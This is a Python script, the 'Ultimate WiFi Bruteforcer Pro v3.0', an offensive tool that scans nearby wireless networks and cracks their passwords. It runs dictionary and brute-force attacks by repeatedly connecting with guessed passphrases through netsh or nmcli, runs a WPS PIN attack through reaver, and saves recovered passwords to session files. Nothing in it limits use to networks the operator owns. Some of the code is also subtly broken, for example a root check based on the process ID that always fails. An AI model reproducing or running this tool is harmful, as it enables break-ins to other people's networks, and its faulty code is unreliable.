#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Coded by rootkitov | Ultimate WiFi Bruteforcer Pro v3.0

import os
import time
import itertools
import subprocess
import sys
import re
import json
import hashlib
import zipfile
import tempfile
from threading import Thread, Lock
from queue import Queue
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WiFiTools:
    def __init__(self):
        self.networks = []
        self.lock = Lock()
        self.stop_event = False
        self.wordlists = {
            'top_100': 'wordlists/top100.txt',
            'top_1k': 'wordlists/top1000.txt',
            'rockyou': 'wordlists/rockyou.txt',
            'custom': None
        }
        self.create_wordlists_dir()
    
    def create_wordlists_dir(self):
        if not os.path.exists('wordlists'):
            os.makedirs('wordlists')
            # Create sample wordlists
            with open('wordlists/top100.txt', 'w') as f:
                f.write("\n".join(["password", "123456", "12345678", "1234", "qwerty"]))
            with open('wordlists/top1000.txt', 'w') as f:
                f.write("\n".join(["password", "123456", "12345678", "1234", "qwerty", "12345"]))
    
    def scan_networks(self):
        self.networks = []
        try:
            if sys.platform == 'win32':
                self._scan_windows()
            else:
                self._scan_linux()
        except Exception as e:
            print(f"{Colors.RED}Scan error: {str(e)}{Colors.END}")
        return self.networks
    
    def _scan_windows(self):
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'networks', 'mode=Bssid'],
                                      stderr=subprocess.DEVNULL,
                                      text=True)
        
        networks = []
        current = {}
        
        for line in result.split('\n'):
            line = line.strip()
            if 'SSID' in line and 'BSSID' not in line:
                if current:
                    networks.append(current)
                current = {'ssid': line.split(':')[1].strip()}
            elif 'Authentication' in line:
                current['auth'] = line.split(':')[1].strip()
            elif 'Encryption' in line:
                current['enc'] = line.split(':')[1].strip()
            elif 'BSSID' in line:
                current['bssid'] = line.split(':')[1].strip()
            elif 'Signal' in line:
                current['signal'] = line.split(':')[1].strip()
            elif 'Channel' in line:
                current['channel'] = line.split(':')[1].strip()
        
        if current:
            networks.append(current)
        
        with self.lock:
            self.networks = networks
    
    def _scan_linux(self):
        try:
            # Try nmcli first
            result = subprocess.check_output(['nmcli', '-t', '-f', 'SSID,BSSID,SIGNAL,SECURITY,CHAN', 'dev', 'wifi'],
                                          stderr=subprocess.DEVNULL,
                                          text=True)
            
            networks = []
            for line in result.strip().split('\n'):
                parts = line.split(':')
                if len(parts) >= 5:
                    networks.append({
                        'ssid': parts[0],
                        'bssid': parts[1],
                        'signal': parts[2],
                        'security': parts[3],
                        'channel': parts[4]
                    })
            
            with self.lock:
                self.networks = networks
            return
        except:
            pass
        
        # Try iwlist as fallback
        try:
            result = subprocess.check_output(['iwlist', 'scan'],
                                         stderr=subprocess.DEVNULL,
                                         text=True)
            
            networks = []
            current = {}
            
            for line in result.split('\n'):
                line = line.strip()
                if 'ESSID:' in line:
                    if current:
                        networks.append(current)
                    current = {'ssid': line.split('"')[1]}
                elif 'Address:' in line:
                    current['bssid'] = line.split(' ')[-1]
                elif 'Quality=' in line:
                    current['signal'] = line.split(' ')[0].split('=')[1]
                elif 'Encryption key:' in line:
                    current['enc'] = line.split(':')[1].strip()
                elif 'Channel:' in line:
                    current['channel'] = line.split(':')[1]
            
            if current:
                networks.append(current)
            
            with self.lock:
                self.networks = networks
        except Exception as e:
            print(f"{Colors.RED}Linux scan error: {str(e)}{Colors.END}")
    
    def check_wifi_interface(self):
        try:
            if sys.platform == 'win32':
                result = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'])
                return 'Wireless' in str(result)
            else:
                result = subprocess.check_output(['iwconfig'])
                return 'IEEE 802.11' in str(result)
        except:
            return False
    
    def test_password(self, ssid, password):
        try:
            if sys.platform == 'win32':
                return self._test_windows(ssid, password)
            else:
                return self._test_linux(ssid, password)
        except Exception as e:
            print(f"{Colors.RED}Test error: {str(e)}{Colors.END}")
            return False
    
    def _test_windows(self, ssid, password):
        profile = f"""
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
            <name>{ssid}</name>
            <SSIDConfig>
                <SSID>
                    <name>{ssid}</name>
                </SSID>
            </SSIDConfig>
            <connectionType>ESS</connectionType>
            <connectionMode>auto</connectionMode>
            <MSM>
                <security>
                    <authEncryption>
                        <authentication>WPA2PSK</authentication>
                        <encryption>AES</encryption>
                        <useOneX>false</useOneX>
                    </authEncryption>
                    <sharedKey>
                        <keyType>passPhrase</keyType>
                        <protected>false</protected>
                        <keyMaterial>{password}</keyMaterial>
                    </sharedKey>
                </security>
            </MSM>
        </WLANProfile>
        """
        with tempfile.NamedTemporaryFile(delete=False, suffix='.xml') as f:
            f.write(profile.encode())
            temp_path = f.name
        
        try:
            subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename="{temp_path}"'], 
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
            
            connect_result = subprocess.run(['netsh', 'wlan', 'connect', 'name=', ssid], 
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         text=True)
            time.sleep(5)
            
            status_result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        text=True)
            
            subprocess.run(['netsh', 'wlan', 'delete', 'profile', ssid], 
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
            
            os.unlink(temp_path)
            return 'State                  : connected' in status_result.stdout
        except:
            if os.path.exists(temp_path):
                os.unlink(temp_path)
            return False
    
    def _test_linux(self, ssid, password):
        try:
            result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password], 
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  text=True)
            time.sleep(3)
            return 'successfully activated' in result.stdout
        except:
            return False
    
    def wps_pin_attack(self, bssid):
        print(f"{Colors.YELLOW}Starting WPS PIN attack on {bssid}{Colors.END}")
        try:
            if sys.platform == 'win32':
                print(f"{Colors.RED}WPS attack not supported on Windows{Colors.END}")
                return False
            
            # Check if reaver is installed
            try:
                subprocess.check_output(['which', 'reaver'], stderr=subprocess.DEVNULL)
            except:
                print(f"{Colors.RED}Reaver not installed. Install with 'sudo apt install reaver'{Colors.END}")
                return False
            
            # Start reaver attack
            print(f"{Colors.CYAN}Running reaver -i wlan0 -b {bssid} -vv -K 1{Colors.END}")
            process = subprocess.Popen(['reaver', '-i', 'wlan0', '-b', bssid, '-vv', '-K', '1'],
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     text=True)
            
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
                    if 'WPS PIN:' in output:
                        pin = re.search(r'WPS PIN: ([0-9]+)', output).group(1)
                        print(f"{Colors.GREEN}Found WPS PIN: {pin}{Colors.END}")
                        process.terminate()
                        return pin
                if self.stop_event:
                    process.terminate()
                    return False
            
            return False
        except Exception as e:
            print(f"{Colors.RED}WPS attack error: {str(e)}{Colors.END}")
            return False
    
    def dictionary_attack(self, ssid, wordlist_path, max_threads=4):
        if not os.path.exists(wordlist_path):
            print(f"{Colors.RED}Wordlist file not found!{Colors.END}")
            return None
        
        attempts = 0
        start_time = time.time()
        found = False
        result_queue = Queue()
        
        def worker():
            nonlocal attempts, found
            with open(wordlist_path, 'r', errors='ignore') as f:
                for line in f:
                    if found or self.stop_event:
                        return
                    
                    password = line.strip()
                    if not password:
                        continue
                    
                    attempts += 1
                    with self.lock:
                        sys.stdout.write(f"\r{Colors.CYAN}Attempt {attempts}: {password.ljust(20)}{Colors.END}")
                        sys.stdout.flush()
                    
                    if self.test_password(ssid, password):
                        result_queue.put(password)
                        found = True
                        return
        
        threads = []
        for _ in range(max_threads):
            t = Thread(target=worker)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        if not result_queue.empty():
            password = result_queue.get()
            print(f"\n{Colors.GREEN}Password found: {password}{Colors.END}")
            print(f"{Colors.YELLOW}Time elapsed: {time.time() - start_time:.2f} seconds{Colors.END}")
            return password
        
        print(f"\n{Colors.RED}Password not found in wordlist.{Colors.END}")
        return None
    
    def brute_attack(self, ssid, charset, min_len=8, max_len=12, max_threads=4):
        attempts = 0
        start_time = time.time()
        found = False
        result_queue = Queue()
        
        def worker(chunk):
            nonlocal attempts, found
            for password in chunk:
                if found or self.stop_event:
                    return
                
                attempts += 1
                with self.lock:
                    sys.stdout.write(f"\r{Colors.CYAN}Attempt {attempts}: {password.ljust(20)}{Colors.END}")
                    sys.stdout.flush()
                
                if self.test_password(ssid, password):
                    result_queue.put(password)
                    found = True
                    return
        
        threads = []
        chunk_size = 10000
        
        print(f"{Colors.PURPLE}Generating password combinations...{Colors.END}")
        
        for length in range(min_len, max_len + 1):
            generator = itertools.product(charset, repeat=length)
            
            while True:
                chunk = list(itertools.islice(generator, chunk_size))
                if not chunk:
                    break
                
                chunk = [''.join(p) for p in chunk]
                
                while len(threads) >= max_threads:
                    for t in threads:
                        if not t.is_alive():
                            threads.remove(t)
                    time.sleep(0.1)
                
                t = Thread(target=worker, args=(chunk,))
                threads.append(t)
                t.start()
                
                if found or self.stop_event:
                    break
            
            if found or self.stop_event:
                break
        
        for t in threads:
            t.join()
        
        if not result_queue.empty():
            password = result_queue.get()
            print(f"\n{Colors.GREEN}Password found: {password}{Colors.END}")
            print(f"{Colors.YELLOW}Time elapsed: {time.time() - start_time:.2f} seconds{Colors.END}")
            return password
        
        print(f"\n{Colors.RED}Password not found in given range.{Colors.END}")
        return None
    
    def save_session(self, ssid, password=None, status='running'):
        session = {
            'ssid': ssid,
            'password': password,
            'status': status,
            'timestamp': datetime.now().isoformat()
        }
        
        if not os.path.exists('sessions'):
            os.makedirs('sessions')
        
        filename = f"sessions/{ssid.replace(' ', '_')}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(session, f)
        
        return filename
    
    def load_wordlists(self):
        available = []
        for name, path in self.wordlists.items():
            if path and os.path.exists(path):
                available.append((name, path))
        
        custom = input(f"{Colors.BLUE}Enter path to custom wordlist (or leave empty): {Colors.END}")
        if custom and os.path.exists(custom):
            available.append(('custom', custom))
        
        return available

def slow_print(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def clear_screen():
    if sys.platform == 'win32':
        subprocess.call('cls', shell=True)
    else:
        subprocess.call('clear', shell=True)

def show_banner():
    clear_screen()
    banner = f"""
{Colors.RED}{Colors.BOLD}
 ██╗   ██╗██╗██████╗ ██╗███████╗██╗   ██╗███████╗██████╗ ██████╗  ██████╗ ████████╗███████╗
 ██║   ██║██║██╔══██╗██║██╔════╝██║   ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝
 ██║   ██║██║██████╔╝██║█████╗  ██║   ██║█████╗  ██║  ██║██████╔╝██║   ██║   ██║   █████╗  
 ╚██╗ ██╔╝██║██╔══██╗██║██╔══╝  ██║   ██║██╔══╝  ██║  ██║██╔══██╗██║   ██║   ██║   ██╔══╝  
  ╚████╔╝ ██║██║  ██║██║██║     ╚██████╔╝███████╗██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
   ╚═══╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
{Colors.END}
{Colors.YELLOW}Ultimate WiFi Bruteforcer Pro v3.0{Colors.END}
{Colors.PURPLE}Coded by rootkitov | Advanced WiFi Penetration Tool{Colors.END}
"""
    slow_print(banner)

def select_network(wifi):
    networks = wifi.scan_networks()
    
    if not networks:
        print(f"{Colors.RED}No networks found!{Colors.END}")
        return None
    
    print(f"\n{Colors.GREEN}Available Networks:{Colors.END}")
    for i, net in enumerate(networks, 1):
        ssid = net.get('ssid', 'Hidden')
        bssid = net.get('bssid', 'N/A')
        signal = net.get('signal', 'N/A')
        channel = net.get('channel', 'N/A')
        security = net.get('security', net.get('auth', 'N/A'))
        
        print(f"{Colors.CYAN}{i}. {ssid.ljust(20)} {Colors.YELLOW}BSSID: {bssid.ljust(17)} Signal: {signal.ljust(8)} Channel: {channel.ljust(4)} Security: {security}{Colors.END}")
    
    while True:
        try:
            choice = input(f"\n{Colors.BLUE}Select network (1-{len(networks)}) or 0 to rescan: {Colors.END}")
            if choice == '0':
                return select_network(wifi)
            
            index = int(choice) - 1
            if 0 <= index < len(networks):
                return networks[index]
            print(f"{Colors.RED}Invalid selection!{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}Please enter a number!{Colors.END}")

def main_menu():
    wifi = WiFiTools()
    
    while True:
        show_banner()
        print(f"{Colors.WHITE}{Colors.BOLD}Main Menu:{Colors.END}")
        print(f"{Colors.YELLOW}1. Scan WiFi networks{Colors.END}")
        print(f"{Colors.YELLOW}2. Dictionary attack{Colors.END}")
        print(f"{Colors.YELLOW}3. Brute-force numeric passwords (0-9){Colors.END}")
        print(f"{Colors.YELLOW}4. Brute-force alphabetic passwords (a-z, A-Z){Colors.END}")
        print(f"{Colors.YELLOW}5. Brute-force alphanumeric passwords (0-9, a-z, A-Z){Colors.END}")
        print(f"{Colors.YELLOW}6. Custom charset brute-force{Colors.END}")
        print(f"{Colors.YELLOW}7. WPS PIN attack{Colors.END}")
        print(f"{Colors.YELLOW}8. View saved sessions{Colors.END}")
        print(f"{Colors.RED}9. Exit{Colors.END}")
        
        choice = input(f"\n{Colors.BLUE}Enter your choice: {Colors.END}")
        
        if choice == '1':
            select_network(wifi)
            input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
        
        elif choice == '2':
            network = select_network(wifi)
            if not network:
                continue
                
            if not wifi.check_wifi_interface():
                print(f"{Colors.RED}No WiFi interface detected!{Colors.END}")
                time.sleep(2)
                continue
                
            wordlists = wifi.load_wordlists()
            if not wordlists:
                print(f"{Colors.RED}No wordlists available!{Colors.END}")
                continue
                
            print(f"\n{Colors.GREEN}Available wordlists:{Colors.END}")
            for i, (name, path) in enumerate(wordlists, 1):
                print(f"{Colors.CYAN}{i}. {name.ljust(10)} ({path}){Colors.END}")
            
            try:
                wl_choice = int(input(f"\n{Colors.BLUE}Select wordlist (1-{len(wordlists)}): {Colors.END}")) - 1
                if 0 <= wl_choice < len(wordlists):
                    print(f"{Colors.PURPLE}Starting dictionary attack on {network['ssid']}...{Colors.END}")
                    wifi.stop_event = False
                    session_file = wifi.save_session(network['ssid'])
                    
                    try:
                        password = wifi.dictionary_attack(network['ssid'], wordlists[wl_choice][1])
                        if password:
                            wifi.save_session(network['ssid'], password, 'success')
                        else:
                            wifi.save_session(network['ssid'], None, 'failed')
                    except KeyboardInterrupt:
                        wifi.stop_event = True
                        wifi.save_session(network['ssid'], None, 'interrupted')
                        print(f"\n{Colors.RED}Attack interrupted by user.{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}Invalid selection!{Colors.END}")
            
            input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
        
        elif choice == '3':
            network = select_network(wifi)
            if not network:
                continue
                
            if not wifi.check_wifi_interface():
                print(f"{Colors.RED}No WiFi interface detected!{Colors.END}")
                time.sleep(2)
                continue
                
            print(f"{Colors.PURPLE}Starting numeric brute-force attack on {network['ssid']}...{Colors.END}")
            wifi.stop_event = False
            session_file = wifi.save_session(network['ssid'])
            
            try:
                password = wifi.brute_attack(network['ssid'], '0123456789')
                if password:
                    wifi.save_session(network['ssid'], password, 'success')
                else:
                    wifi.save_session(network['ssid'], None, 'failed')
            except KeyboardInterrupt:
                wifi.stop_event = True
                wifi.save_session(network['ssid'], None, 'interrupted')
                print(f"\n{Colors.RED}Attack interrupted by user.{Colors.END}")
            
            input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
        
        elif choice == '4':
            network = select_network(wifi)
            if not network:
                continue
                
            if not wifi.check_wifi_interface():
                print(f"{Colors.RED}No WiFi interface detected!{Colors.END}")
                time.sleep(2)
                continue
                
            print(f"{Colors.PURPLE}Starting alphabetic brute-force attack on {network['ssid']}...{Colors.END}")
            wifi.stop_event = False
            session_file = wifi.save_session(network['ssid'])
            
            try:
                password = wifi.brute_attack(network['ssid'], 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
                if password:
                    wifi.save_session(network['ssid'], password, 'success')
                else:
                    wifi.save_session(network['ssid'], None, 'failed')
            except KeyboardInterrupt:
                wifi.stop_event = True
                wifi.save_session(network['ssid'], None, 'interrupted')
                print(f"\n{Colors.RED}Attack interrupted by user.{Colors.END}")
            
            input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
        
        elif choice == '5':
            network = select_network(wifi)
            if not network:
                continue
                
            if not wifi.check_wifi_interface():
                print(f"{Colors.RED}No WiFi interface detected!{Colors.END}")
                time.sleep(2)
                continue
                
            print(f"{Colors.PURPLE}Starting alphanumeric brute-force attack on {network['ssid']}...{Colors.END}")
            wifi.stop_event = False
            session_file = wifi.save_session(network['ssid'])
            
            try:
                password = wifi.brute_attack(network['ssid'], '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
                if password:
                    wifi.save_session(network['ssid'], password, 'success')
                else:
                    wifi.save_session(network['ssid'], None, 'failed')
            except KeyboardInterrupt:
                wifi.stop_event = True
                wifi.save_session(network['ssid'], None, 'interrupted')
                print(f"\n{Colors.RED}Attack interrupted by user.{Colors.END}")
            
            input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
        
        elif choice == '6':
            network = select_network(wifi)
            if not network:
                continue
                
            if not wifi.check_wifi_interface():
                print(f"{Colors.RED}No WiFi interface detected!{Colors.END}")
                time.sleep(2)
                continue
                
            charset = input(f"{Colors.BLUE}Enter custom character set: {Colors.END}")
            print(f"{Colors.PURPLE}Starting custom brute-force attack on {network['ssid']}...{Colors.END}")
            wifi.stop_event = False
            session_file = wifi.save_session(network['ssid'])
            
            try:
                password = wifi.brute_attack(network['ssid'], charset)
                if password:
                    wifi.save_session(network['ssid'], password, 'success')
                else:
                    wifi.save_session(network['ssid'], None, 'failed')
            except KeyboardInterrupt:
                wifi.stop_event = True
                wifi.save_session(network['ssid'], None, 'interrupted')
                print(f"\n{Colors.RED}Attack interrupted by user.{Colors.END}")
            
            input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
        
        elif choice == '7':
            network = select_network(wifi)
            if not network or 'bssid' not in network:
                print(f"{Colors.RED}No BSSID information available for WPS attack.{Colors.END}")
                continue
                
            if not wifi.check_wifi_interface():
                print(f"{Colors.RED}No WiFi interface detected!{Colors.END}")
                time.sleep(2)
                continue
                
            wifi.stop_event = False
            session_file = wifi.save_session(network['ssid'])
            
            try:
                pin = wifi.wps_pin_attack(network['bssid'])
                if pin:
                    wifi.save_session(network['ssid'], f"WPS PIN: {pin}", 'success')
                else:
                    wifi.save_session(network['ssid'], None, 'failed')
            except KeyboardInterrupt:
                wifi.stop_event = True
                wifi.save_session(network['ssid'], None, 'interrupted')
                print(f"\n{Colors.RED}Attack interrupted by user.{Colors.END}")
            
            input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
        
        elif choice == '8':
            if not os.path.exists('sessions'):
                print(f"{Colors.RED}No sessions found.{Colors.END}")
            else:
                sessions = []
                for file in os.listdir('sessions'):
                    if file.endswith('.json'):
                        with open(f"sessions/{file}", 'r') as f:
                            try:
                                sessions.append(json.load(f))
                            except:
                                pass
                
                if not sessions:
                    print(f"{Colors.RED}No valid sessions found.{Colors.END}")
                else:
                    print(f"\n{Colors.GREEN}Saved Sessions:{Colors.END}")
                    for i, session in enumerate(sessions, 1):
                        status_color = Colors.GREEN if session.get('status') == 'success' else Colors.RED if session.get('status') == 'failed' else Colors.YELLOW
                        print(f"{Colors.CYAN}{i}. {session.get('ssid', 'N/A').ljust(20)} {status_color}{session.get('status', 'unknown').ljust(12)}{Colors.END} Password: {session.get('password', 'N/A')} {Colors.YELLOW}({session.get('timestamp', '')}){Colors.END}")
            
            input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
        
        elif choice == '9':
            print(f"{Colors.RED}Exiting...{Colors.END}")
            time.sleep(1)
            break
        
        else:
            print(f"{Colors.RED}Invalid choice!{Colors.END}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        if os.getpid() != 0:
            print(f"{Colors.RED}This tool requires root privileges!{Colors.END}")
            sys.exit(1)
            
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Operation cancelled by user.{Colors.END}")
        sys.exit(0)